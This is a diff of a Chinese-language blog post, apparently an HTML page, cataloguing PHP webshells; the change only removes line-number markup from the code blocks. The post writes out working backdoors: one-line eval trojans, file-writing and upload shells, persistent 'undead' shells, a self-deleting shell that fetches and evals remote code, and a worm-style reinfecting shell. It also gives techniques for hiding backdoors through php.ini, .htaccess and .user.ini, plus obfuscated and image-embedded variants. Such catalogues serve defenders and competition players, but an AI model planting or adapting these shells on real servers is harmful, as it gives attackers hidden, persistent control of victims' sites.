@@ -258,7 +258,7 @@
 <h2 id="0x01-Webshell原理"><a href="#0x01-Webshell原理" class="headerlink" title="0x01 Webshell原理"></a>0x01 Webshell原理</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p>WebShell是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以称做为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后通过浏览器来访问这些asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序命令等）</p>
 <h3 id="2-组成"><a href="#2-组成" class="headerlink" title="2. 组成"></a>2. 组成</h3><p><img src="https://lcx.cc/file/old/1722_1.png"></p>
 <p>结构：数据传递 + 数据执行</p>
-<h3 id="3-变形思路"><a href="#3-变形思路" class="headerlink" title="3. 变形思路"></a>3. 变形思路</h3><pre class="line-numbers language-none"><code class="language-none">1. 数据传递:
+<h3 id="3-变形思路"><a href="#3-变形思路" class="headerlink" title="3. 变形思路"></a>3. 变形思路</h3><pre class="language-none"><code class="language-none">1. 数据传递:
 　　1) $_GET、$_POST、$_COOKIES、$_FILE...(HTTP包中的任何位置都可以作为payload的传输媒介)
 　　2) 从远程远程URL中获取数据: file_get_contents、curl、svn_checkout...(将需要执行的指令数据放在远程URL中，通过URL_INCLUDE来读取)
 　　3) 从磁盘文件中获取数据: file、file_get_contents...(将需要执行的指令数据放在磁盘文件中，利用IO函数来读取)
@@ -269,27 +269,27 @@
 　　1) eva、system...l执行(这是最普通、标准的代码执行)
 　　2) LFI: include、require...(利用浏览器的伪协议将文件包含转化为代码执行)
 　　3) 动态函数执行($()...PHP的动态函数特性)
-　　4) Curly Syntax($&#123;$&#123;...&#125;&#125;...把变量赋值的漏洞转化为代码执行)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+　　4) Curly Syntax($&#123;$&#123;...&#125;&#125;...把变量赋值的漏洞转化为代码执行)</code></pre>
 
 <h2 id="0x02-Webshell类型"><a href="#0x02-Webshell类型" class="headerlink" title="0x02 Webshell类型"></a>0x02 Webshell类型</h2><h3 id="1-一句话木马"><a href="#1-一句话木马" class="headerlink" title="1. 一句话木马"></a>1. 一句话木马</h3><p>最常见一句话木马</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 通过 eval&#x2F;assert 等能够将字符串作为php代码执行的能力，将 $_POST&#x2F;$_REQUEST&#x2F;$_GET 中传递的字符串作为PHP代码执行
+<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 通过 eval&#x2F;assert 等能够将字符串作为php代码执行的能力，将 $_POST&#x2F;$_REQUEST&#x2F;$_GET 中传递的字符串作为PHP代码执行
 
 &lt;?php @eval($_POST[&#39;hack&#39;]); ?&gt;
-&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+&lt;?php assert($_REQUEST[&quot;pass&quot;]);?&gt;</code></pre>
 
 <p>最短一句话，使用反引号无回显执行命令</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;&#96;$_GET[1]&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">&lt;?&#x3D;&#96;$_GET[1]&#96;;</code></pre>
 
 <h3 id="2-小马"><a href="#2-小马" class="headerlink" title="2. 小马"></a>2. 小马</h3><p>通过较少的代码，用于完成写入文件、列出目录、查看文件、执行一些系统命令等少量功能的 Webshell</p>
 <p><strong>写文件小马</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">
+<pre class="language-none"><code class="language-none">
 &lt;?php
 $test&#x3D;&#39;&lt;?php $a&#x3D;$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#39;;
 file_put_contents(&quot;shell.php&quot;, $test);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <p><strong>文件上传马</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
 header(&quot;content-Type: text&#x2F;html; charset&#x3D;utf-8&quot;);
 ?&gt;
 &lt;? 
@@ -310,12 +310,12 @@ if ($_POST)&#123;
   $f&#x3D;fopen($_POST[&quot;file&quot;],&quot;w&quot;);
   echo   fwrite($f,$_POST[&quot;text&quot;])? &#39;保存成功!&#39; : &#39;保存失败!&#39;;
 &#125;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="3-大马"><a href="#3-大马" class="headerlink" title="3. 大马"></a>3. 大马</h3><p>PHP大马就是功能较全，支持各种在渗透过程中可能用到的各种功能的大型代码集合，通常具有文件管理、命令执行、端口扫描、数据库管理、反弹shell等等的功能</p>
 <p>如：adminer、phpspy 等</p>
 <h3 id="4-内存马"><a href="#4-内存马" class="headerlink" title="4. 内存马"></a>4. 内存马</h3><p>内存马，又称不死马，就是会运行一段永远不退出的程序常驻在PHP进程里，无限执行</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 通过死循环创建webshell文件
+<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 通过死循环创建webshell文件
 
 &lt;?php 
 ignore_user_abort(true);
@@ -328,10 +328,10 @@ while (1)&#123;
     system(&#39;touch -m -d &quot;2019-10-01 10:10:10&quot; .2.php&#39;);
     usleep(5000);
 &#125; 
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="5-自删除木马"><a href="#5-自删除木马" class="headerlink" title="5. 自删除木马"></a>5. 自删除木马</h3><p>自删除木马，在运行一次后会将自身文件删除，但将某些代码运行至进程中，无文件木马类型之一</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
 unlink($_SERVER[&#39;SCRIPT_FILENAME&#39;]);
 ignore_user_abort(true);
 set_time_limit(0);
@@ -341,11 +341,11 @@ while($code &#x3D; file_get_contents($remote_file))&#123;
   @eval($code);
   sleep(5);
 &#125;;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="6-蠕虫马"><a href="#6-蠕虫马" class="headerlink" title="6. 蠕虫马"></a>6. 蠕虫马</h3><p>交叉感染的木马，可以把本地的php会写shell插入到其他php原文件，通过相互复活机制，与其他已感染的主机中的webshell互相复活</p>
 <p><strong>3s_NWGeek 木马</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
 $tips &#x3D; &#39;AWD_Light_Check&#39;;
 &#x2F;&#x2F;这个是后面检查的是否感染头，如果没有，就会重写这个php
 error_reporting(0);
@@ -503,20 +503,20 @@ try &#123;
         header(&#39;HTTP&#x2F;1.1 500 Internal Server Error&#39;);
     &#125;
 &#125; catch (Exception $e2) &#123;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#125;</code></pre>
 
 <h2 id="0x03-命令执行方式"><a href="#0x03-命令执行方式" class="headerlink" title="0x03 命令执行方式"></a>0x03 命令执行方式</h2><h3 id="1-直接执行"><a href="#1-直接执行" class="headerlink" title="1. 直接执行"></a>1. 直接执行</h3><p>使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
 @eval(&#39;echo 命令执行;&#39;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="2-动态函数执行"><a href="#2-动态函数执行" class="headerlink" title="2. 动态函数执行"></a>2. 动态函数执行</h3><p>先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php    
+<pre class="language-none"><code class="language-none">&lt;?php    
 $a&#x3D;&quot;phpinfo&quot;;$a();
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="3-文件包含执行"><a href="#3-文件包含执行" class="headerlink" title="3. 文件包含执行"></a>3. 文件包含执行</h3><p>有两个php文件，把执行命令的放在文件b中，使用文件a去包含，达到执行的效果</p>
-<pre class="line-numbers language-none"><code class="language-none">b.php
+<pre class="language-none"><code class="language-none">b.php
 &lt;?php
 @eval(&#39;echo 命令执行;&#39;);
 ?&gt;
@@ -524,26 +524,26 @@ $a&#x3D;&quot;phpinfo&quot;;$a();
 a.php
 &lt;?php
 include a.php;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="4-回调函数"><a href="#4-回调函数" class="headerlink" title="4. 回调函数"></a>4. 回调函数</h3><p>将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行
+<pre class="language-none"><code class="language-none">&#x2F;&#x2F; array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行
 
 
 &lt;?php
 $func &#x3D; &#39;system&#39;;
 $arr &#x3D; array(&#39;id&#39;);
 array_map($func, $arr);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="5-PHP-Curly-Syntax"><a href="#5-PHP-Curly-Syntax" class="headerlink" title="5. PHP Curly Syntax"></a>5. PHP Curly Syntax</h3><p>在字符串中掺杂变量，再使用变量去拼接字符串，达到命令执行的效果</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
 $a &#x3D; &#39;p&#39;;
 eval(&quot;&#123;$a&#125;hpinfo();&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="6-php反序列化"><a href="#6-php反序列化" class="headerlink" title="6. php反序列化"></a>6. php反序列化</h3><p>根据php反序列化漏洞来实现命令执行，先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
 
 class test&#123;
     public $a&#x3D;&quot;123&quot;;
@@ -553,29 +553,29 @@ class test&#123;
 &#125;
 unserialize(&#39;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#39;);
 
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="7-php-x2F-x2F-input方法"><a href="#7-php-x2F-x2F-input方法" class="headerlink" title="7. php:&#x2F;&#x2F;input方法"></a>7. php:&#x2F;&#x2F;input方法</h3><p><code>php://input</code> 可以访问请求的原始数据的只读流，可以理解为我们传post参数，<code>php://input</code> 会读取到，这时候就可以加以利用</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<pre class="language-none"><code class="language-none">&lt;?php
 @eval(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;));
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="8-preg-replace方法"><a href="#8-preg-replace方法" class="headerlink" title="8. preg_replace方法"></a>8. preg_replace方法</h3><p><code>preg_replace</code> 函数执行一个正则表达式的搜索和替换。可以使用一个命令执行函数去替换正常的字符串，然后去执行命令</p>
-<pre class="line-numbers language-none"><code class="language-none">
+<pre class="language-none"><code class="language-none">
 &lt;?php
 echo preg_replace(&quot;&#x2F;test&#x2F;e&quot;,phpinfo(),&quot;test&quot;);
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
 <h3 id="9-ob-start函数"><a href="#9-ob-start函数" class="headerlink" title="9. ob_start函数"></a>9. ob_start函数</h3><p><code>ob_start</code>函数是打开输出控制缓冲，传入的参数会在使用<code>ob_end_flush</code>函数的时候去调用它执行输出在缓冲区的数据</p>
-<pre class="line-numbers language-none"><code class="language-none">
+<pre class="language-none"><code class="language-none">
 &lt;?php
 $cmd &#x3D; &#39;system&#39;;
 ob_start($cmd);
 echo &quot;id&quot;;
 ob_end_flush(); &#x2F;&#x2F;输出全部内容到浏览器
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h2 id="0x04-变种与隐藏"><a href="#0x04-变种与隐藏" class="headerlink" title="0x04 变种与隐藏"></a>0x04 变种与隐藏</h2><h3 id="1-php-ini隐藏后门"><a href="#1-php-ini隐藏后门" class="headerlink" title="1. php.ini隐藏后门"></a>1. php.ini隐藏后门</h3><pre class="line-numbers language-none"><code class="language-none">在php.ini 中添加:
+<h2 id="0x04-变种与隐藏"><a href="#0x04-变种与隐藏" class="headerlink" title="0x04 变种与隐藏"></a>0x04 变种与隐藏</h2><h3 id="1-php-ini隐藏后门"><a href="#1-php-ini隐藏后门" class="headerlink" title="1. php.ini隐藏后门"></a>1. php.ini隐藏后门</h3><pre class="language-none"><code class="language-none">在php.ini 中添加:
 
 auto_prepend_file &#x3D; webshell.php
 ; (auto_prepend_file是在任意PHP脚本的头部)
@@ -586,14 +586,14 @@ include_path &#x3D; &quot;&#x2F;usr&#x2F;share&#x2F;www&#x2F;shell;.&quot;
 ;我们所要include的文件目录放在根目录的前边。不然的话apache会在根目录下搜索我们的后门(当然是没有了从而导致服务器解析php文件失败)
 
 在&quot;&#x2F;usr&#x2F;share&#x2F;www&#x2F;shell&quot;中创建 webshell.php: &lt;?php eval($_POST[1]); ?&gt;
-这样可以将webshell藏在磁盘上的任意位置，不一定是要web目录，然后在整个服务器运行期间放置后门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+这样可以将webshell藏在磁盘上的任意位置，不一定是要web目录，然后在整个服务器运行期间放置后门</code></pre>
 
 <p>这种利用php.ini的webshell部署攻击方式，一般来说，只有黑客具有了远程修改文件或者已经拿到了目标主机的权限，为了之后的隐蔽访问，而采取的在php.ini中部署一个”后门”，这种webshell部署更倾向于隐藏后门</p>
 <h3 id="2-htaccess文件PHP后门"><a href="#2-htaccess文件PHP后门" class="headerlink" title="2. .htaccess文件PHP后门"></a>2. .htaccess文件PHP后门</h3><p>.htaccess是apache的分布式配置文件，提供了针对不同WEB应用对应的子目录改变配置的方法，.htaccess中的指令可以对httpd.conf进行覆盖，前提是httpd.conf中开启了允许覆盖的开关</p>
-<pre class="line-numbers language-none"><code class="language-none">AllowOverride All<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="language-none"><code class="language-none">AllowOverride All</code></pre>
 
 <p><strong>.htaccess指令</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1. AddHandler
+<pre class="language-none"><code class="language-none">1. AddHandler
     1) Description: Maps the filename extensions to the specified handler
     2) Syntax: AddHandler handler-name extension [extension] ...
     3) Context: server config, virtual host, directory, .htaccess
@@ -625,10 +625,10 @@ example: AddType text&#x2F;html .logs  &#x2F;&#x2F;指定了.logs的后缀的文
     7) Compatibility: Moved into the core in Apache 2.0
 
 refer: http:&#x2F;&#x2F;httpd.apache.org&#x2F;docs&#x2F;2.2&#x2F;mod&#x2F;core.html#sethandler
-example: SetHandler application&#x2F;x-httpd-php  &#x2F;&#x2F;将所有脚本请求都强制指定为使用&quot;application&#x2F;x-httpd-php&quot;进行解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+example: SetHandler application&#x2F;x-httpd-php  &#x2F;&#x2F;将所有脚本请求都强制指定为使用&quot;application&#x2F;x-httpd-php&quot;进行解析</code></pre>
 
 <p><strong>隐藏方式</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1）SetHandler
+<pre class="language-none"><code class="language-none">1）SetHandler
   a. 可将php代码存于非php后缀文件，例: x.png
   b. 将以下代码写入.htaccess中
      SetHandler application&#x2F;x-httpd-php
@@ -643,10 +643,10 @@ example: SetHandler application&#x2F;x-httpd-php  &#x2F;&#x2F;将所有脚本请
 
 3) php_value
   将以下代码写入.htaccess中, 文件路径必须是绝对路径，访问网站上任何php文件都会启动该php后门木马
-  php_value auto_append_file &#x2F;usr&#x2F;share&#x2F;www&#x2F;webshell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  php_value auto_append_file &#x2F;usr&#x2F;share&#x2F;www&#x2F;webshell.php</code></pre>
 
 <h3 id="3-user-ini文件构成的PHP后门"><a href="#3-user-ini文件构成的PHP后门" class="headerlink" title="3. .user.ini文件构成的PHP后门"></a>3. .user.ini文件构成的PHP后门</h3><p>.user.ini是php应用的分布式配置文件，与.htaccess的利用思想类似，.user.ini也利用分布式的自定义配置文件、从而进行”配置覆盖、劫持”</p>
-<pre class="line-numbers language-none"><code class="language-none">1. 自PHP 5.3.0起，PHP支持基于每个目录的&quot;.htaccess风格&quot;的&quot;INI文件&quot;。此类文件仅被CGI&#x2F;FastCGI SAPI处理。此功能使得PECL的 htscanner扩展作废。如果使用Apache，则用.htaccess 文件有同样效果 
+<pre class="language-none"><code class="language-none">1. 自PHP 5.3.0起，PHP支持基于每个目录的&quot;.htaccess风格&quot;的&quot;INI文件&quot;。此类文件仅被CGI&#x2F;FastCGI SAPI处理。此功能使得PECL的 htscanner扩展作废。如果使用Apache，则用.htaccess 文件有同样效果 
 
 2. 除了主php.ini之外，PHP还会在每个目录下扫描INI文件，从被执行的PHP文件所在目录开始一直上升到web根目录($_SERVER[&#39;DOCUMENT_ROOT&#39;] 所指定的)。如果被执行的PHP文件在web根目录之外，则只扫描该目录。
 
@@ -665,11 +665,11 @@ example: SetHandler application&#x2F;x-httpd-php  &#x2F;&#x2F;将所有脚本请
     2) 默认值是: .user.ini 
 
 6. user_ini.cache_ttl控制着重新读取用户INI文件的间隔时间
-    默认是300秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    默认是300秒</code></pre>
 
 <p>在.user.ini风格的INI文件中只有具有”PHP_INI_PERDIR”和”PHP_INI_USER”模式的INI设置可被识别，由此可以知道，”.user.ini”实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为”PHP_INI_PERDIR、PHP_INI_USER”的设置</p>
 <p>与php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间(默认为300秒)，即可被重新加载</p>
-<h3 id="4-利用PHP动态变量特性"><a href="#4-利用PHP动态变量特性" class="headerlink" title="4. 利用PHP动态变量特性"></a>4. 利用PHP动态变量特性</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="4-利用PHP动态变量特性"><a href="#4-利用PHP动态变量特性" class="headerlink" title="4. 利用PHP动态变量特性"></a>4. 利用PHP动态变量特性</h3><pre class="language-none"><code class="language-none">&lt;?php
     &#x2F;&#x2F;@eval($_POST[&#39;op&#39;]);
     @eval($&#123;&quot;_P&quot;.&quot;OST&quot;&#125;[&#39;op&#39;]);
 ?&gt;
@@ -692,16 +692,16 @@ example: SetHandler application&#x2F;x-httpd-php  &#x2F;&#x2F;将所有脚本请
 &lt;?php
     @eval($_FILES[&#39;name&#39;]);
 ?&gt;
-(再把payload写在文件名中)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+(再把payload写在文件名中)</code></pre>
 
-<h3 id="5-tiny-php-shell"><a href="#5-tiny-php-shell" class="headerlink" title="5. tiny php shell"></a>5. tiny php shell</h3><pre class="line-numbers language-none"><code class="language-none">需目标服务器php.ini开启如下配置：
+<h3 id="5-tiny-php-shell"><a href="#5-tiny-php-shell" class="headerlink" title="5. tiny php shell"></a>5. tiny php shell</h3><pre class="language-none"><code class="language-none">需目标服务器php.ini开启如下配置：
 short_open_tag &#x3D; On
 
 &lt;?&#x3D;($_&#x3D;@$_GET[2]).@$_($_GET[1])?&gt;
 
-http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;webshell.php?2&#x3D;system&amp;1&#x3D;dir <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;webshell.php?2&#x3D;system&amp;1&#x3D;dir </code></pre>
 
-<h3 id="6-无字母-webshell"><a href="#6-无字母-webshell" class="headerlink" title="6. 无字母 webshell"></a>6. 无字母 webshell</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+<h3 id="6-无字母-webshell"><a href="#6-无字母-webshell" class="headerlink" title="6. 无字母 webshell"></a>6. 无字母 webshell</h3><pre class="language-none"><code class="language-none">&lt;?php
 $_&#x3D;&quot;&quot;;
 $_[+$_]++;
 $_&#x3D;$_.&quot;&quot;;
@@ -727,9 +727,9 @@ $__($_(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));
 &#x2F;&#x2F;ASSERT(BASE64_DECODE(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));
 &#x2F;&#x2F;ASSERT(&quot;eval($_POST[1])&quot;);
 &#x2F;&#x2F;key:&#x3D;1
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="7-图片木马"><a href="#7-图片木马" class="headerlink" title="7. 图片木马"></a>7. 图片木马</h3><pre class="line-numbers language-none"><code class="language-none">webshell.php:
+<h3 id="7-图片木马"><a href="#7-图片木马" class="headerlink" title="7. 图片木马"></a>7. 图片木马</h3><pre class="language-none"><code class="language-none">webshell.php:
 &lt;?php
     $wp__theme_icon&#x3D;create_function(&#39;&#39;,file_get_contents(&#39;&#x2F;hack.gif&#39;));
     $wp__theme_icon();
@@ -740,16 +740,16 @@ phpinfo();
 这是图片木马的利用方式的一种，但是这种方不能像include那样有兼容性，include的情况是允许include进来的语句有错误，PHP会忽略这些错误，而去执行include进来的有效PHP代码
 string create_function ( string $args , string $code )
 
-而create_function(&#39;&#39;,file_get_contents(&#39;&#x2F;hack.gif&#39;)); 这种方法不允许图片中有非法数据(真实的图片数据)，否则就会出现解析错误，所以攻击者只能把纯的木马脚本保存成图片格式，这样就可能导致无法绕过图片上传防御机制 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+而create_function(&#39;&#39;,file_get_contents(&#39;&#x2F;hack.gif&#39;)); 这种方法不允许图片中有非法数据(真实的图片数据)，否则就会出现解析错误，所以攻击者只能把纯的木马脚本保存成图片格式，这样就可能导致无法绕过图片上传防御机制 </code></pre>
 
 <p><strong>注意</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">1. short_open_tag &#x3D; On
+<pre class="language-none"><code class="language-none">1. short_open_tag &#x3D; On
 由于jpg、gif等格式的图片中，出现&lt;?字符的频率很高，很容易造成PHP解析错误
 
 2. short_open_tag &#x3D; Off
-这种情况下，图片WEBSHELL的运行较稳定，攻击者插入的&lt;?php ?&gt;能够得到稳定的执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+这种情况下，图片WEBSHELL的运行较稳定，攻击者插入的&lt;?php ?&gt;能够得到稳定的执行</code></pre>
 
-<h3 id="8-字符串拼接-PHP动态函数执行"><a href="#8-字符串拼接-PHP动态函数执行" class="headerlink" title="8. 字符串拼接+PHP动态函数执行"></a>8. 字符串拼接+PHP动态函数执行</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 用于动态执行的字符串必须是&quot;assert&quot;，不能是&quot;eval&quot;，因为在PHP中，eval不是函数，而assert是函数
+<h3 id="8-字符串拼接-PHP动态函数执行"><a href="#8-字符串拼接-PHP动态函数执行" class="headerlink" title="8. 字符串拼接+PHP动态函数执行"></a>8. 字符串拼接+PHP动态函数执行</h3><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 用于动态执行的字符串必须是&quot;assert&quot;，不能是&quot;eval&quot;，因为在PHP中，eval不是函数，而assert是函数
 
 &lt;?php
     $char_as&#x3D;&#39;as&#39;;
@@ -758,9 +758,9 @@ string create_function ( string $args , string $code )
     $char_base64_decode&#x3D;&#39;b&#39;.$char_as.$char_e.(64).&#39;_&#39;.&#39;d&#39;.$char_e.&#39;c&#39;.&#39;o&#39;.&#39;d&#39;.$char_e;
     @$char_assert(@$char_base64_decode(&#39;ZXZhbCgkX1BPU1RbMTIzXSkK&#39;));
     &#x2F;&#x2F;ZXZhbCgkX1BPU1RbMTIzXSkK: &quot;eval($_POST[123])&quot;
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+?&gt;</code></pre>
 
-<h3 id="9-Curly-Syntax"><a href="#9-Curly-Syntax" class="headerlink" title="9. Curly Syntax"></a>9. Curly Syntax</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php 
+<h3 id="9-Curly-Syntax"><a href="#9-Curly-Syntax" class="headerlink" title="9. Curly Syntax"></a>9. Curly Syntax</h3><pre class="language-none"><code class="language-none">&lt;?php 
     $k &#x3D; &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;
 ?&gt;
 
@@ -771,10 +771,10 @@ string create_function ( string $args , string $code )
 
 http:&#x2F;&#x2F;localhost&#x2F;shell&#x2F;index.php?op&#x3D;$&#123;$&#123;fputs(fopen(&quot;webshell.php&quot;, &quot;w+&quot;), &quot;&lt;?php eval(\$_POST[1]);?&gt;webshell&quot;)&#125;&#125;;
 
-&#x2F;&#x2F; 当应用系统的输入点存在注入点，并且这个输入能够到达代码的某个变量赋值的代码流位置，攻击者可以利用这次&quot;变量赋值&quot;进行一次&quot;代码执行&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&#x2F;&#x2F; 当应用系统的输入点存在注入点，并且这个输入能够到达代码的某个变量赋值的代码流位置，攻击者可以利用这次&quot;变量赋值&quot;进行一次&quot;代码执行&quot;</code></pre>
 
 <p>curl语法代码执行是不能带回显，不能作为一个webshell指令执行跳板来使用，而只能作为”一次性代码执行且不需要回显”的场景，即向本地磁盘写一个新的webshell文件</p>
